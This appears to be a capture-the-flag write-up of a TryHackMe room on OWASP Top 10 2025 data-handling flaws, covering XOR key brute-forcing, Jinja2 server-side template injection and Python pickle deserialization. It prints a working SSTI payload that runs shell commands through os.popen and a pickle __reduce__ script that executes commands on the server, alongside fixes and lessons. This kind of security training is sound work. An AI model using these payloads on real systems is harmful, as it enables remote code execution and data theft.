# TryHackMe — OWASP Top 10 2025: Insecure Data Handling

|Field|Details|
|---|---|
|**Platform**|TryHackMe|
|**Room**|[OWASP Top 10 2025: Insecure Data Handling](https://tryhackme.com/room/owasptopten2025three)|
|**Difficulty**|Easy|
|**Type**|Web Application Security|
|**Category**|Cryptographic Failures, Injection, Software & Data Integrity Failures|
|**Tags**|OWASP Top 10 2025, XOR, CyberChef, SSTI, Jinja2, Pickle Deserialization, Python|
|**Completed**|June 2026|

---

## Overview

This room covers three OWASP Top 10 2025 categories through hands-on web application challenges. Each task exposes a real-world data handling flaw and requires actively exploiting it to retrieve a flag.

**Vulnerabilities covered:**

- **A04 — Cryptographic Failures** (weak XOR encryption, brute-forced key)
- **A05 — Injection** (Server-Side Template Injection via Jinja2)
- **A08 — Software or Data Integrity Failures** (insecure Python pickle deserialization)

---

## Task 1 — A04: Cryptographic Failures (Weak XOR Encryption)

### Concept

Cryptographic failures happen when sensitive data is not adequately protected — due to missing encryption, faulty implementation, or insufficient security measures. This includes storing passwords without hashing, using outdated or weak algorithms (MD5, SHA-1, DES, or XOR), exposing encryption keys, or failing to secure data in transit.

Passwords should be hashed using slow, modern functions like `bcrypt`, `scrypt`, or `Argon2`. When encrypting data, always rely on trusted, industry-standard libraries — never roll your own algorithm.

### Challenge

> Navigate to `MACHINE_IP:8001`. This web app uses a weak, shared derivative key to protect notes with XOR encryption. Decrypt the notes and find the flag.

### Approach

Navigated to `MACHINE_IP:8001`. The application presented three Base64-encoded, XOR-encrypted notes.

**Key observations:**

- XOR with a short key is trivially brute-forceable
- The key format was hinted to follow the pattern `KEY_` + a single digit
- Only one character was unknown

Used **CyberChef** to brute-force the key:

1. Input: one of the encrypted notes
2. Operations: `From Base64` → `XOR`
3. Tried keys `KEY_0` through `KEY_9`
4. `KEY_1` produced readable plaintext — confirmed as the correct key

Applied `KEY_1` to all three notes. One of them contained the flag.

**Key insight:** XOR encryption with a short, predictable key provides almost no security. With partial knowledge of the key format, the entire keyspace can be exhausted in seconds. This is why weak or homegrown cryptography should never be used for sensitive data.

### Flag

> 🚩 `THM{WEAK_CRYPTO_FLAG}`

---

## Task 2 — A05: Injection (Server-Side Template Injection — SSTI)

### Concept

Injection occurs when an application takes user input and passes it directly into a system that can execute commands or queries — a database, shell, templating engine, or API — without sanitisation.

**Types of injection:**

- SQL Injection — unsanitised input in database queries
- Command Injection — input passed directly to OS shell
- **SSTI** — user input rendered inside a server-side template engine
- AI Prompt Injection — malicious instructions embedded in LLM inputs

### Challenge

> Navigate to `MACHINE_IP:8000`. Perform an SSTI attack to read the contents of `flag.txt` in the application directory.

### Approach

Navigated to `MACHINE_IP:8000` — an **SSTI Playground** that intentionally renders raw user input inside a **Jinja2 template** using `render_template_string`.

**Step 1 — Confirm template injection:**

The lab itself noted that Jinja2 templates can access Python objects when not sandboxed. Tested with a basic math expression to confirm the engine evaluates input:

```
{{4*1}}
```

If the output is `4`, the input is being evaluated as a template — not just displayed as text. This confirms SSTI.

**Step 2 — Access Python builtins via the template:**

Jinja2 gives access to Python objects through builtins. The lab hints suggested using `config`, `request`, `cycler`, `joiner`, or `lipsum` as starting points for object traversal.

**Step 3 — Read flag.txt:**

Crafted a payload to traverse Python's object hierarchy and execute a file read:

```
{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
```

Submitted via the payload input box and clicked **Render payload**. The server executed `cat flag.txt` and returned the contents in the response.

**Key insight:** User-controlled strings being passed to `render_template_string` is never safe. The fix is to never render raw user input as a template — always treat input as data, not code. Use `render_template` with predefined templates instead.

### Flag

> 🚩 `THM{SSTI_FLAG_OBTAINED}`

---

## Task 3 — A08: Software or Data Integrity Failures (Insecure Deserialization)

### Concept

Software or Data Integrity Failures occur when an application blindly trusts code, updates, or data without verifying their authenticity or origin. This includes:

- Trusting software updates without cryptographic verification
- Loading scripts or configs from untrusted sources
- **Accepting serialised data without validating what it contains**

Python's `pickle` module is particularly dangerous — it supports arbitrary code execution via the `__reduce__` method, meaning any pickled object submitted to an application can run OS commands when deserialized.

### Challenge

> Navigate to `MACHINE_IP:8002`. Craft a malicious Python pickle payload that reads `flag.txt` and submit it to the application.

### Approach

Navigated to `MACHINE_IP:8002` — the application accepts serialised (pickled) data and deserializes it without any integrity checks.

**Step 1 — Craft the malicious pickle payload:**

Created a Python script that defines a class with a `__reduce__` method — this method is called automatically by pickle during deserialization and can execute arbitrary commands:

```python
import pickle
import base64
import subprocess

class MaliciousLS:
    def __reduce__(self):
        # Command to execute on the server
        cmd = ['ls', '-la']
        # subprocess.check_output runs the command and returns output as bytes
        return (subprocess.check_output, (cmd,))

# Serialize the malicious object and Base64-encode it for submission
pickled = pickle.dumps(MaliciousLS())
encoded = base64.b64encode(pickled).decode()
print(encoded)
```

**Step 2 — Modify to read flag.txt:**

Changed the command from `ls -la` to `cat flag.txt`:

```python
cmd = ['cat', 'flag.txt']
```

**Step 3 — Submit the payload:**

Ran the script to generate the Base64-encoded payload, then submitted it to the application at `MACHINE_IP:8002`. The server deserialized the object, triggering `__reduce__`, which executed `cat flag.txt` and returned the contents.

**Key insight:** Python's `pickle` module should **never** be used to deserialize data from untrusted sources. There is no safe way to sandbox pickle — the only fix is to use a safe serialization format like JSON, which cannot execute code, and to cryptographically sign data before accepting it.

### Flag

> 🚩 `THM{INSECURE_DESERIALIZATION}`

---

## Summary Table

|OWASP ID|Vulnerability|Root Cause|Fix|
|---|---|---|---|
|A04|Cryptographic Failure|Weak XOR encryption with short, predictable key|Use AES-GCM or ChaCha20 with securely generated random keys|
|A05|Injection (SSTI)|User input rendered directly inside Jinja2 template|Never pass user input to `render_template_string`; use data-only templates|
|A08|Software & Data Integrity Failure|Pickle deserialization of untrusted input|Use JSON for serialization; cryptographically sign all data|

---

## Key Lessons Learned

1. **Short, predictable encryption keys are brute-forceable in seconds.** `KEY_1` through `KEY_9` is an 9-attempt keyspace. Encryption keys must be long, random, and unpredictable — never derived from patterns a human might guess.
    
2. **Template engines execute code — user input must never reach them directly.** Jinja2 is a code execution environment, not a display engine. Passing `render_template_string(user_input)` is equivalent to calling `eval(user_input)`.
    
3. **SSTI gives full server access.** Once you can inject into a Jinja2 template, you can traverse Python's object model to reach `os`, `subprocess`, or any other module — effectively giving you a remote code execution shell.
    
4. **`pickle` is not a data format — it is a code execution format.** Deserializing any pickled object from an untrusted source will execute whatever `__reduce__` returns. There is no safe way to validate a pickle payload before deserializing it.
    
5. **Integrity verification must be explicit.** Applications should cryptographically sign all data they produce (using HMAC or similar) and verify that signature before processing any data they receive. If the signature doesn't match, reject it.
    
6. **Injection vulnerabilities share a root cause: treating input as code.** SQL injection, SSTI, command injection, and insecure deserialization all happen because the application fails to maintain a hard boundary between data and executable code. Parameterised inputs and safe APIs enforce that boundary.
    

---

## References

- [TryHackMe — OWASP Top 10 2025: Insecure Data Handling](https://tryhackme.com/room/owasptopten2025three)
- [OWASP A04 — Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [OWASP A05 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP A08 — Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Python pickle security warning](https://docs.python.org/3/library/pickle.html)